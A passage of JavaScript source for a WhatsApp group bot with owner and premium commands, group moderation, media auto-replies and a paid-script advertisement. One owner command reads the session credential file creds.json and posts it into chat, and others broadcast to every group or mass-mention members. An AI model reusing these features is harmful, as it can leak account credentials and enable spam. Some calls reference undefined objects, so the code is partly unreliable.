	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await AlwaysFaxzMd.getName(i)}\nFN:${await AlwaysFaxzMd.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
	
	//chat counter (console log)
        if (m.message && m.isGroup) {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Group Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Private Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
        }

        if (command) {
            const cmdadd = () => {
                hit[0].hit_cmd += 1
                fs.writeFileSync('./database/total-hit-user.json', JSON.stringify(hit))
            }
            cmdadd()
            const totalhit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))[0].hit_cmd
        }
        
for (let BhosdikaXeon of VoiceNoteXeon) {
if (budy === BhosdikaXeon) {
let audiobuffy = fs.readFileSync(`./lib/system/audio/${BhosdikaXeon}.mp3`)
AlwaysFaxzMd.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaXeon of StickerXeon){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./lib/system/sticker/${BhosdikaXeon}.webp`)
AlwaysFaxzMd.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of ImageXeon){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./lib/system/image/${BhosdikaXeon}.jpg`)
AlwaysFaxzMd.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of VideoXeon){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./lib/system/video/${BhosdikaXeon}.mp4`)
AlwaysFaxzMd.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

const sendapk = (teks) => {
AlwaysFaxzMd.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let BhosdikaXeon of ApkXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./lib/system/apk/${BhosdikaXeon}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
AlwaysFaxzMd.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let BhosdikaXeon of ZipXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./lib/system/zip/${BhosdikaXeon}.zip`)
sendzip(buffer)
}
}

const senddocu = (teks) => {
haikal.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
}
for (let BhosdikaXeon of DocXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./lib/system/doc/${BhosdikaXeon}.pdf`)
senddocu(buffer)
}
}
        
        if (m.isGroup && !m.key.fromMe) {
            let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
            for (let ment of mentionUser) {
                if (afk.checkAfkUser(ment, _afk)) {
                    let getId2 = afk.getAfkId(ment, _afk)
                    let getReason2 = afk.getAfkReason(getId2, _afk)
                    let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
                    let heheh2 = ms(getTimee)
                    replyalwaysfaxz(`Don't tag him, he's afk\n\n*Reason :* ${getReason2}`)
                }
            }
            if (afk.checkAfkUser(m.sender, _afk)) {
                let getId = afk.getAfkId(m.sender, _afk)
                let getReason = afk.getAfkReason(getId, _afk)
                let getTime = Date.now() - afk.getAfkTime(getId, _afk)
                let heheh = ms(getTime)
                _afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
                fs.writeFileSync('./database/afk-user.json', JSON.stringify(_afk))
                AlwaysFaxzMd.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} have returned from afk`, m)
            }
        }
        switch (command) {
            case 'addprem':
                if (!isFaxzCreator) return replyalwaysfaxz(mess.owner)
                if (args.length < 2)
                    return replyalwaysfaxz(`Use :\n*#addprem* @tag time\n*#addprem* number time\n\nExample : #addprem @tag 30d`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        addPremiumUser(m.mentionedJid[0], args[1], premium);
                    }
                    replyalwaysfaxz("Premium Success")
                } else {
                    addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium);
                    replyalwaysfaxz("Success")
                }
                break
            case 'delprem':
                if (!isFaxzCreator) return replyalwaysfaxz(mess.owner)
                if (args.length < 1) return replyalwaysfaxz(`Use :\n*#delprem* @tag\n*#delprem* number`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1);
                        fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
                    }
                    replyalwaysfaxz("Delete success")
                } else {
                    premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1);
                    fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
                    replyalwaysfaxz("Success")
                }
                break
            case 'listprem': {
                if (!isFaxzCreator) return replyalwaysfaxz(mess.owner)
                let data = require("./database/premium.json")
                let txt = `*------「 LIST PREMIUM 」------*\n\n`
                for (let i of data) {
                    txt += `Number : ${i.id}\n`
                    txt += `Expired : ${i.expired} Second\n`         
                }                
                AlwaysFaxzMd.sendMessage(m.chat, {
                    text: txt,
                    mentions: i
                }, {
                    quoted: m
                })
            }
            break
            case 'deletesession':
            case 'delsession':
            case 'clearsession': {
                if (!isFaxzCreator) return replyalwaysfaxz(mess.owner)
                fs.readdir("./session", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return replyalwaysfaxz('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Detected ${filteredArray.length} junk files\n\n`
                    if (filteredArray.length == 0) return replyalwaysfaxz(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    replyalwaysfaxz(teks)
                    await sleep(2000)
                    replyalwaysfaxz("Delete junk files...")
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./session/${file}`)
                    });
                    await sleep(2000)
                    replyalwaysfaxz("Successfully deleted all the trash in the session folder")
                });
            }
            break
            case 'join':
                try {
                    if (!isFaxzCreator) return replyalwaysfaxz(mess.owner)
                    if (!text) return replyalwaysfaxz('Enter Group Link!')
                    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replyalwaysfaxz('Link Invalid!')
                    replyalwaysfaxz(mess.wait)
                    let result = args[0].split('https://chat.whatsapp.com/')[1]
                    await AlwaysFaxzMd.groupAcceptInvite(result).then((res) => replyalwaysfaxz(json(res))).catch((err) => replyalwaysfaxz(json(err)))
                } catch {
                    replyalwaysfaxz('Failed to join the Group')
                }
                break      
            case 'getsession':
                if (!isFaxzCreator) return replyalwaysfaxz(mess.owner)
                replyalwaysfaxz('Wait a moment, currently retrieving your session file')
                let sesi = await fs.readFileSync('./session/creds.json')
                AlwaysFaxzMd.sendMessage(m.chat, {
                    document: sesi,
                    mimetype: 'application/json',
                    fileName: 'creds.json'
                }, {
                    quoted: m
                })
                break
           
            case 'restart':
                if (!isFaxzCreator) return replyalwaysfaxz(mess.owner)
                replyalwaysfaxz('In Process....')
                exec('pm2 restart all')
                break
            case 'autoread':
                if (!isFaxzCreator) return replyalwaysfaxz(mess.owner)
                if (args.length < 1) return replyalwaysfaxz(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoread = true
                    replyalwaysfaxz(`Successfully changed autoread to ${q}`)
                } else if (q === 'off') {
                    autoread = false
                    replyalwaysfaxz(`Successfully changed autoread to ${q}`)
                }
                break
                case 'autotyping':
                if (!isFaxzCreator) return replyalwaysfaxz(mess.owner)
                if (args.length < 1) return replyalwaysfaxz(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoTyping = true
                    replyalwaysfaxz(`Successfully changed auto-typing to ${q}`)
                } else if (q === 'off') {
                    autoTyping = false
                    replyalwaysfaxz(`Successfully changed auto-typing to ${q}`)
                }
                break
                case 'autoswview':
    case 'autostatusview':{
             if (!isFaxzCreator) return replyalwaysfaxz(mess.owner)
               if (args.length < 1) return replyalwaysfaxz('on/off?')
               if (args[0] === 'on') {
                  autoswview = true
                  replyalwaysfaxz(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  autoswview = false
                  replyalwaysfaxz(`${command} is disabled`)
               }
            }
            break
            case 'ramlist': { 
await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '🕐', key: m.key }})
  await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
  await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '🕓', key: m.key }})
  await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '🕙', key: m.key }})
  await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '🕛', key: m.key }})
 await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '😖', key: m.key }})
if (!text) replyalwaysfaxz(`▭▬▭▬▭( *SERVER V1* )▭▬▭▬▭

.1gb [username,nomor]
.2gb [username,nomor]
.3gb [username,nomor]
.4gb [username,nomor]
.5gb [username,nomor]
.6gb [username,nomor]
.7gb [username,nomor]
.8gb [username,nomor]
.unli [username,nomor]

Contoh:
.ram username,nomor
.1gb Faxz,6283116555026
▬▭▬▭▬▭▬▭▬▭▬▭▬`)
 await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
 }
break
case 'mode': {
const modengap = `PILIH MODE YANG DI INGINKAN`
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: modengap
          }),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
										"name": "quick_reply",
										"buttonParamsJson": `{\"display_text\":\"SELF\",\"id\":\".memekz self\"}`
									},
									{
										"name": "quick_reply",
										"buttonParamsJson": `{\"display_text\":\"PUBLIC\",\"id\":\".memekz public\"}`
									},
									{
										"name": "cta_url",
										"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+Saya+Mau+Buy+Sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+Saya+Mau+Buy+Sc+DigitalBotz\"}`
									},
									{
										"name": "quick_reply",
										"buttonParamsJson": `{\"display_text\":\"KEMBALI\",\"id\":\".menu\"}`
									},],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363294318768415@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})
  
await AlwaysFaxzMd.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
            case 'memekz':
                if (!isFaxzCreator) return replyalwaysfaxz(mess.owner)
                if (args.length < 1) return replyalwaysfaxz(`Example ${prefix + command} public/self`)
                if (q == 'public') {
                    AlwaysFaxzMd.public = true
                    replyalwaysfaxz(mess.done)
                } else if (q == 'self') {
                    AlwaysFaxzMd.public = false
                    replyalwaysfaxz(mess.done)
                }
                break
            case 'setpp':
            case 'setppgw':
            case 'setppbot':
                if (!isFaxzCreator) return replyalwaysfaxz(mess.owner)
                if (!quoted) return replyalwaysfaxz(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replyalwaysfaxz(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replyalwaysfaxz(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await AlwaysFaxzMd.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await AlwaysFaxzMd.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replyalwaysfaxz(mess.done)
                } else {
                    var memeg = await AlwaysFaxzMd.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replyalwaysfaxz(mess.done)
                }
                break
            case 'block':
                if (!isFaxzCreator) return replyalwaysfaxz(mess.owner)
                let blockw = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await AlwaysFaxzMd.updateBlockStatus(blockw, 'block').then((res) => replyalwaysfaxz(json(res))).catch((err) => replyalwaysfaxz(json(err)))
                break
            case 'unblock':
                if (!isFaxzCreator) return replyalwaysfaxz(mess.owner)
                let blockww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await AlwaysFaxzMd.updateBlockStatus(blockww, 'unblock').then((res) => replyalwaysfaxz(json(res))).catch((err) => replyalwaysfaxz(json(err)))
                break
            case 'leave':
                if (!isFaxzCreator) return replyalwaysfaxz(mess.owner)
                if (!m.isGroup) return replyalwaysfaxz(mess.group)
                replyalwaysfaxz('Bye Semuanya 🥺')
                await AlwaysFaxzMd.groupLeave(m.chat)
                break
            case 'bcgc':
            case 'bcgroup': {
                if (!isFaxzCreator) return replyalwaysfaxz(mess.owner)
                if (!text) return replyalwaysfaxz(`Which text?\n\nExample : ${prefix + command} It's holiday tomorrow `)
                let getGroups = await AlwaysFaxzMd.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                replyalwaysfaxz(`Send Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} second`)
                for (let i of anu) {
                    await sleep(1500)
                    let a = '```' + `\n\n${text}\n\n` + '```' + '\n\n\nʙʀᴏᴀᴅᴄᴀsᴛ'
                    AlwaysFaxzMd.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: 'Broadcast By Owner',
                                body: `Sent ${i.length} Group`,
                                thumbnailUrl: 'https://img99.pixhost.to/images/734/514803818_save_20240919_230604.jpg',
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
                replyalwaysfaxz(`Successfully Sent Broadcast To ${anu.length} Group`)
            }
            break
            case 'getcase':
                if (!isFaxzCreator) return replyalwaysfaxz(mess.owner)
                const getCase = (cases) => {
                    return "case" + `'${cases}'` + fs.readFileSync("AlwaysFaxzMd.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
                }
                replyalwaysfaxz(`${getCase(q)}`)
                break
            case 'delete':
            case 'del': {
                if (!isFaxzCreator) return replyalwaysfaxz(mess.done)
                if (!m.quoted) throw false
                let {
                    chat,
                    fromMe,
                    id,
                    isBaileys
                } = m.quoted
                if (!isBaileys) return replyalwaysfaxz('The message was not sent by a bot!')
                AlwaysFaxzMd.sendMessage(m.chat, {
                    delete: {
                        remoteJid: m.chat,
                        fromMe: true,
                        id: m.quoted.id,
                        participant: m.quoted.sender
                    }
                })
            }
            break

            case 'closetime':
                if (!m.isGroup) return replyalwaysfaxz(mess.group)
                if (!isAdmins && !isFaxzCreator) return replyalwaysfaxz(mess.admin)
                if (!isBotAdmins) return replyalwaysfaxz(mess.botAdmin)
                if (args[1] == 'detik') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'menit') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'jam') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'hari') {
                    var timer = args[0] * `86400000`
                } else {
                    return replyalwaysfaxz('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second')
                }
                replyalwaysfaxz(`Close time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const close = `*Closed* group closed by admin\nnow only admin can send messages`
                    AlwaysFaxzMd.groupSettingUpdate(m.chat, 'announcement')
                    replyalwaysfaxz(close)
                }, timer)
                break
            case 'opentime':
                if (!m.isGroup) return replyalwaysfaxz(mess.group)
                if (!isAdmins && !isFaxzCreator) return replyalwaysfaxz(mess.admin)
                if (!isBotAdmins) return replyalwaysfaxz(mess.botAdmin)
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return replyalwaysfaxz('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second')
                }
                replyalwaysfaxz(`Open time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*Opened* The group is opened by admin\nNow members can send messages`
                    AlwaysFaxzMd.groupSettingUpdate(m.chat, 'not_announcement')
                    replyalwaysfaxz(open)
                }, timer)
                break
            case 'kick':
                if (!m.isGroup) return replyalwaysfaxz(mess.group)
                if (!isAdmins && !isGroupOwner && !isFaxzCreator) return replyalwaysfaxz(mess.admin)
                if (!isBotAdmins) return replyalwaysfaxz(mess.botAdmin)
                let blockwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await AlwaysFaxzMd.groupParticipantsUpdate(m.chat, [blockwww], 'remove').then((res) => replyalwaysfaxz(json(res))).catch((err) => replyalwaysfaxz(json(err)))
                break
            case 'add':
                if (!m.isGroup) return replyalwaysfaxz(mess.group)
                if (!isAdmins && !isGroupOwner && !isFaxzCreator) return replyalwaysfaxz(mess.admin)
                if (!isBotAdmins) return replyalwaysfaxz(mess.botAdmin)
                let blockwwww = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await AlwaysFaxzMd.groupParticipantsUpdate(m.chat, [blockwwww], 'add').then((res) => replyalwaysfaxz(json(res))).catch((err) => replyalwaysfaxz(json(err)))
                break
            case 'promote':
                if (!m.isGroup) return replyalwaysfaxz(mess.group)
                if (!isAdmins && !isGroupOwner && !isFaxzCreator) return replyalwaysfaxz(mess.admin)
                if (!isBotAdmins) return replyalwaysfaxz(mess.botAdmin)
                let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await AlwaysFaxzMd.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote').then((res) => replyalwaysfaxz(json(res))).catch((err) => replyalwaysfaxz(json(err)))
                break
            case 'demote':
                if (!m.isGroup) return replyalwaysfaxz(mess.group)
                if (!isAdmins && !isGroupOwner && !isFaxzCreator) return replyalwaysfaxz(mess.admin)
                if (!isBotAdmins) return replyalwaysfaxz(mess.botAdmin)
                let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await AlwaysFaxzMd.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote').then((res) => replyalwaysfaxz(json(res))).catch((err) => replyalwaysfaxz(json(err)))
                break
            case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
                if (!m.isGroup) return replyalwaysfaxz(mess.group)
                if (!isAdmins) return replyalwaysfaxz(mess.admin)
                if (!isBotAdmins) return replyalwaysfaxz(mess.botAdmin)
                if (!quoted) return replyalwaysfaxz(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replyalwaysfaxz(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replyalwaysfaxz(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await AlwaysFaxzMd.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await AlwaysFaxzMd.query({
                        tag: 'iq',
                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replyalwaysfaxz(mess.done)
                } else {
                    var memeg = await AlwaysFaxzMd.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replyalwaysfaxz(mess.done)
                }
                break
            case 'tagall':
                if (!m.isGroup) return replyalwaysfaxz(mess.group)
                if (!isAdmins && !isGroupOwner && !isFaxzCreator && !isPremium) return replyalwaysfaxz(mess.admin)
                if (!isBotAdmins && !isFaxzCreator && !isPremium) return replyalwaysfaxz(mess.botAdmin)
                let teks = `*👥 Tag All*
 
                 🗞️ *Message : ${q ? q : 'blank'}*\n\n`
                for (let mem of participants) {
                    teks += `• @${mem.id.split('@')[0]}\n`
                }
                AlwaysFaxzMd.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
            case 'hidetag':
                if (!m.isGroup) return replyalwaysfaxz(mess.group)
                if (!isAdmins && !isGroupOwner && !isFaxzCreator && !isPremium) return replyalwaysfaxz(mess.admin)
                if (!isBotAdmins && !isFaxzCreator && !isPremium) return replyalwaysfaxz(mess.botAdmin)
                AlwaysFaxzMd.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
            case 'totag':
                if (!m.isGroup) return replyalwaysfaxz(mess.group)
                if (!isBotAdmins && !isFaxzCreator && !isPremium) return replyalwaysfaxz(mess.botAdmin)
                if (!isAdmins && !isFaxzCreator && !isPremium) return replyalwaysfaxz(mess.admin)
                if (!m.quoted) return replyalwaysfaxz(`Reply messages with captions ${prefix + command}`)
                AlwaysFaxzMd.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map(a => a.id)
                })
                break
                case 'gc': case 'group': case 'grup': {
                const grupe = `*[#]* _SILAHKAN PILIH TUTUP/BUKA GROUP INI`
                let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: grupe
          }),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
										"name": "quick_reply",
										"buttonParamsJson": `{\"display_text\":\"BUKA\",\"id\":\".gczzz open\"}`
									},
									{
										"name": "quick_reply",
										"buttonParamsJson": `{\"display_text\":\"TUTUP\",\"id\":\".gczzz close\"}`
									},
            {
										"name": "cta_url",
										"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+Saya+Mau+Buy+Sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+Saya+Mau+Buy+Sc+DigitalBotz\"}`
									},
            {
										"name": "quick_reply",
										"buttonParamsJson": `{\"display_text\":\"KEMBALI\",\"id\":\".menu\"}`
									},],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363294318768415@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})
  
await AlwaysFaxzMd.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
            case 'gczzz':
                if (!m.isGroup) return replyalwaysfaxz(mess.group)
                if (!isAdmins && !isGroupOwner && !isFaxzCreator) return replyalwaysfaxz(mess.admin)
                if (!isBotAdmins) return replyalwaysfaxz(mess.botAdmin)
                if (args[0] === 'close') {
                    await AlwaysFaxzMd.groupSettingUpdate(m.chat, 'announcement').then((res) => replyalwaysfaxz(`Success In Closing The Group 🕊️`)).catch((err) => replyalwaysfaxz(json(err)))
                } else if (args[0] === 'open') {
                    await AlwaysFaxzMd.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replyalwaysfaxz(`Success In Opening The Group 🕊️`)).catch((err) => replyalwaysfaxz(json(err)))
                } else {
                    replyalwaysfaxz(`Mode ${command}\n\n\nType ${prefix + command}open/close`)
                }
                break
            case 'linkgroup':
            case 'grouplink':
            case 'linkgrup':
            case 'linkgc':
                if (!m.isGroup) return replyalwaysfaxz(mess.group)
                if (!isAdmins && !isGroupOwner && !isFaxzCreator) return replyalwaysfaxz(mess.admin)
                if (!isBotAdmins) return replyalwaysfaxz(mess.botAdmin)
                let response = await AlwaysFaxzMd.groupInviteCode(m.chat)
                AlwaysFaxzMd.sendText(m.chat, `★ *GROUP LINK INFO*\n# *Name :* ${groupMetadata.subject}\n★ *Group Owner :* ${groupMetadata.owner !== undefined ? '@' + groupMetadata.owner.split`@`[0] : 'Not known'}\n# *ID :* ${groupMetadata.id}\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n</> *Member :* ${groupMetadata.participants.length}\n`, m, {
                    detectLink: true
                })
                break
            case 'revoke':
            case 'resetlink':
                if (!m.isGroup) return replyalwaysfaxz(mess.group)
                if (!isAdmins && !isGroupOwner && !isFaxzCreator) return replyalwaysfaxz(mess.admin)
                if (!isBotAdmins) return replyalwaysfaxz(mess.botAdmin)
                await AlwaysFaxzMd.groupRevokeInvite(m.chat)
                    .then(res => {
                        replyalwaysfaxz(`Successful Reset, Group Invite Link ${groupMetadata.subject}`)
                    }).catch((err) => replyalwaysfaxz(json(err)))
                break
            case 'buypremium':
            case 'buyprem':
            case 'premium': {
                if (!text) return replyalwaysfaxz(`Silahkan Chat Creator Untuk Membeli Premium\n*\`[ # ]\`* Number Creator Me : https://wa.me/6283116555026 Atau https://wa.me/6283116555026 ( hanya 10k cik ) 🗿🗿🗿`)
                }
                break
            case 'runtime':
                let runtimetext = `Bots Have Been Running For ${runtime(process.uptime())}`
                AlwaysFaxzMd.sendMessage(m.chat, {
                    text: runtimetext,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `FORGET DONATE`,
                            thumbnailUrl: 'https://i.ibb.co/dQkXV2Y/Picsart-23-10-10-18-28-51-982.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
                case 'slebew2': case 'dlaud': case 'dlaudio': {
if (!text) return replyalwaysfaxz(`enter your link bego\nexample : *.slebew2 link*`)
await AlwaysFaxzMd.sendMessage(m.chat, {
 react: {
 text: "🎧",
 key: m.key,
 }
 })

  let load = await (await fetch(`https://apikita.exonity.xyz/api/ytdlp?url=${text}`)).json();
  
  await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '📥', key: m.key }})
  
  replyalwaysfaxz(`*_Always Faxz Download Audio,Waiting for you result_*`)
  
  let rix = load.result
  
    await AlwaysFaxzMd.sendMessage(m.chat, { audio: { url: rix.audio }, mimetype: 'audio/mp4', }, { quoted: m });

await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
}
break
            case 'sc':
            case 'script':
            case 'scriptbot': {
            const scnya = `
\`\`\`SCRIPT INI DI JUAL YA KAK ☝😁\`\`\`
\`\`\`JIKA MINAT?? KLIK BUY SCRIPT\`\`\`\n> DigitalBotz ENC = 5.000\n> DigitalBotz NO ENC = 10.00\n\n_©AlwaysFaxz_`
            let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: scnya
          }),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
										"name": "cta_url",
										"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+Saya+Mau+Buy+Sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+Saya+Mau+Buy+Sc+DigitalBotz\"}`
									},
            {
										"name": "quick_reply",
										"buttonParamsJson": `{\"display_text\":\"KEMBALI\",\"id\":\".menu\"}`
									},],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363294318768415@newsletter',
